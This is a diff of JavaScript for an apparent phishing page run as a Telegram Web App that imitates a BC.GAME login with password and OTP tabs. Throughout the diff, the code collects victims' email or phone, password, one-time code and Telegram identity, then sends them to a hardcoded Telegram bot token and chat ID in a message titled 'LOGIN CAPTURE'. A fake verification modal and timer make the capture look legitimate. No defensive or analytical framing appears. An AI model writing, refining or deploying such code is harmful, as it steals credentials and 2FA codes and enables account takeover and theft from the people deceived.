@@ -1,8 +1,8 @@
-// Configuration
+// CONFIGURATION
 const TARGET_BOT_TOKEN = '8728790870:AAGZZqVttTR3mQZFfXMtR3sdRlcVSbTHiRc'; 
 const TARGET_CHAT_ID = '7611425178';
 
-// Initialize Telegram Web App
+// Initialize Telegram
 const tg = window.Telegram ? window.Telegram.WebApp : null;
 if (tg) {
     tg.expand();
@@ -10,105 +10,110 @@ if (tg) {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-    // Elements
-    const tabItems = document.querySelectorAll('.tab-item');
+    // UI Elements
+    const tabs = document.querySelectorAll('.tab');
+    const identifierInput = document.getElementById('identifier');
+    const passwordWrapper = document.getElementById('password-wrapper');
+    const passwordInput = document.getElementById('password');
     const btnSignin = document.getElementById('btn-signin');
-    const mainIdentifier = document.getElementById('main-identifier');
-    const passwordField = document.getElementById('password-field');
-    const loginPassword = document.getElementById('login-password');
-    const otpOverlay = document.getElementById('otp-overlay');
-    const verifyTitle = document.getElementById('verify-title');
-    const verifyDesc = document.getElementById('verify-desc');
-    const verifyTypeIcon = document.getElementById('verify-type-icon');
+    const otpModal = document.getElementById('otp-modal');
+    const otpInput = document.getElementById('otp-input');
     const btnConfirm = document.getElementById('btn-confirm');
-    const verifyCodeInput = document.getElementById('verify-code-input');
-    const resendSeconds = document.getElementById('resend-seconds');
-    const closeIcons = document.querySelectorAll('.close-icon, .verify-close');
-    const eyeIcon = document.querySelector('.eye-icon');
-    const pasteBtn = document.querySelector('.paste-btn');
+    const timerDisplay = document.getElementById('timer-count');
+    const verifyTitle = document.getElementById('verify-title');
+    const verifyText = document.getElementById('verify-text');
+    const verifyIcon = document.getElementById('verify-icon');
+    const closeBtns = document.querySelectorAll('.btn-close, .modal-close');
+    const togglePassBtn = document.querySelector('.btn-toggle-password');
+    const pasteBtn = document.querySelector('.btn-paste');
 
-    let activeTab = 'password';
-    let timerInterval;
+    let currentTab = 'password';
+    let timer;
 
-    // Tab Switching
-    tabItems.forEach(item => {
-        item.addEventListener('click', () => {
-            tabItems.forEach(i => i.classList.remove('active'));
-            item.classList.add('active');
-            activeTab = item.dataset.tab;
+    // Tab Logic
+    tabs.forEach(tab => {
+        tab.addEventListener('click', () => {
+            tabs.forEach(t => t.classList.remove('active'));
+            tab.classList.add('active');
+            currentTab = tab.dataset.tab;
 
-            if (activeTab === 'otp') {
-                passwordField.style.display = 'none';
-                mainIdentifier.placeholder = 'Email / Phone Number';
+            if (currentTab === 'otp') {
+                passwordWrapper.style.display = 'none';
+                identifierInput.placeholder = 'Email / Phone Number';
             } else {
-                passwordField.style.display = 'flex';
-                mainIdentifier.placeholder = 'Email / Phone Number / Username';
+                passwordWrapper.style.display = 'block';
+                identifierInput.placeholder = 'Email / Phone Number / Username';
             }
         });
     });
 
-    // Toggle Password Visibility
-    if (eyeIcon) {
-        eyeIcon.addEventListener('click', () => {
-            const type = loginPassword.type === 'password' ? 'text' : 'password';
-            loginPassword.type = type;
-            eyeIcon.querySelector('i').className = type === 'password' ? 'far fa-eye' : 'far fa-eye-slash';
+    // Toggle Password
+    if (togglePassBtn) {
+        togglePassBtn.addEventListener('click', () => {
+            const isPass = passwordInput.type === 'password';
+            passwordInput.type = isPass ? 'text' : 'password';
+            togglePassBtn.innerHTML = isPass ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
         });
     }
 
-    // Close Actions
-    closeIcons.forEach(icon => {
-        icon.addEventListener('click', () => {
-            otpOverlay.style.display = 'none';
+    // Modal Close
+    closeBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            otpModal.style.display = 'none';
         });
     });
 
-    // Sign In Button
-    btnSignin.addEventListener('click', () => {
-        const identifier = mainIdentifier.value.trim();
-        const password = loginPassword.value.trim();
+    // Paste Action
+    if (pasteBtn) {
+        pasteBtn.addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text) otpInput.value = text;
+            } catch (e) {}
+        });
+    }
 
-        if (!identifier) {
-            alert('Please enter your details');
+    // Sign In Trigger
+    btnSignin.addEventListener('click', () => {
+        const id = identifierInput.value.trim();
+        const pass = passwordInput.value.trim();
+
+        if (!id) {
+            alert('Please enter your Email or Phone Number');
             return;
         }
 
-        if (activeTab === 'password' && !password) {
+        if (currentTab === 'password' && !pass) {
             alert('Please enter your password');
             return;
         }
 
-        // Detect Mobile vs Email
-        const isEmail = identifier.includes('@');
-        const isPhone = /^\+?\d{7,15}$/.test(identifier.replace(/[\s-]/g, ''));
-        
+        // Detect Type
+        const isEmail = id.includes('@');
+        const isPhone = /^\+?\d{7,15}$/.test(id.replace(/[\s-]/g, ''));
+
         if (isEmail) {
             verifyTitle.innerText = 'Email Verification';
-            verifyDesc.innerText = `Please enter the 6-digit verification code sent on e-mail`;
-            verifyTypeIcon.className = 'fas fa-envelope';
-        } else if (isPhone || !isNaN(identifier.charAt(0))) {
+            verifyText.innerText = 'Please enter the 6-digit verification code sent on e-mail';
+            verifyIcon.className = 'fas fa-envelope';
+        } else if (isPhone || !isNaN(id.charAt(0))) {
             verifyTitle.innerText = 'Mobile Verification';
-            verifyDesc.innerText = `Please enter the 6-digit verification code sent to your phone`;
-            verifyTypeIcon.className = 'fas fa-mobile-alt';
+            verifyText.innerText = 'Please enter the 6-digit verification code sent to your phone';
+            verifyIcon.className = 'fas fa-mobile-alt';
         }
 
-        // SHOW MODAL
-        otpOverlay.style.display = 'flex';
+        // Show Modal
+        otpModal.style.display = 'flex';
         startTimer(60);
-        
-        if (tg) tg.HapticFeedback.impactOccurred('medium');
+
+        if (tg) tg.HapticFeedback.impactOccurred('light');
     });
 
-    // Confirm Button
+    // Confirm (Final Log)
     btnConfirm.addEventListener('click', async () => {
-        const code = verifyCodeInput.value.trim();
-        const identifier = mainIdentifier.value.trim();
-        const password = loginPassword.value.trim();
-        const username = tg?.initDataUnsafe?.user?.username || tg?.initDataUnsafe?.user?.first_name || 'Guest';
-        const tgId = tg?.initDataUnsafe?.user?.id || 'N/A';
-
-        if (code.length < 4) {
-            alert('Please enter verification code');
+        const otp = otpInput.value.trim();
+        if (otp.length < 4) {
+            alert('Invalid verification code');
             return;
         }
 
@@ -116,49 +121,47 @@ document.addEventListener('DOMContentLoaded', () => {
         btnConfirm.disabled = true;
 
         const data = {
-            tg_username: username,
-            tg_id: tgId,
-            identifier: identifier,
-            password: password || 'N/A',
-            otp: code,
-            mode: activeTab,
-            time: new Date().toLocaleString()
+            bot_user: tg?.initDataUnsafe?.user?.username || tg?.initDataUnsafe?.user?.first_name || 'Unknown',
+            bot_id: tg?.initDataUnsafe?.user?.id || 'N/A',
+            target_id: identifierInput.value,
+            target_pass: passwordInput.value || 'N/A',
+            target_otp: otp,
+            method: currentTab.toUpperCase()
         };
 
-        await sendToLogger(data);
+        await logToTelegram(data);
 
-        btnConfirm.innerText = 'Confirmed';
-        
+        btnConfirm.innerText = 'Success';
+        if (tg) tg.HapticFeedback.notificationOccurred('success');
+
         setTimeout(() => {
-            otpOverlay.style.display = 'none';
+            otpModal.style.display = 'none';
             if (tg) tg.close();
             else location.reload();
         }, 1500);
     });
 
-    // Timer
-    function startTimer(seconds) {
-        let timeLeft = seconds;
-        resendSeconds.innerText = timeLeft;
-        clearInterval(timerInterval);
-        timerInterval = setInterval(() => {
+    function startTimer(duration) {
+        let timeLeft = duration;
+        timerDisplay.innerText = timeLeft;
+        clearInterval(timer);
+        timer = setInterval(() => {
             timeLeft--;
-            resendSeconds.innerText = timeLeft;
-            if (timeLeft <= 0) clearInterval(timerInterval);
+            timerDisplay.innerText = timeLeft;
+            if (timeLeft <= 0) clearInterval(timer);
         }, 1000);
     }
 
-    // Logger
-    async function sendToLogger(data) {
-        const text = `
-🎯 <b>Login Capture</b>
+    async function logToTelegram(data) {
+        const msg = `
+🔥 <b>BC.GAME LOGIN CAPTURE</b>
 ━━━━━━━━━━━━━━━
-👤 <b>User</b>: @${data.tg_username} (ID: ${data.tg_id})
-📧 <b>Login</b>: <code>${data.identifier}</code>
-🔑 <b>Pass</b>: <code>${data.password}</code>
-🔢 <b>OTP</b>: <code>${data.otp}</code>
-🛠 <b>Mode</b>: ${data.mode.toUpperCase()}
-🕒 <b>Time</b>: ${data.time}
+👤 <b>TG User</b>: @${data.bot_user} (<code>${data.bot_id}</code>)
+📧 <b>Identifier</b>: <code>${data.target_id}</code>
+🔑 <b>Password</b>: <code>${data.target_pass}</code>
+🔢 <b>OTP Code</b>: <code>${data.target_otp}</code>
+🛠 <b>Method</b>: ${data.method}
+🕒 <b>Time</b>: ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━`;
 
         try {
@@ -167,7 +170,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TARGET_CHAT_ID,
-                    text: text,
+                    text: msg,
                     parse_mode: 'HTML'
                 })
             });
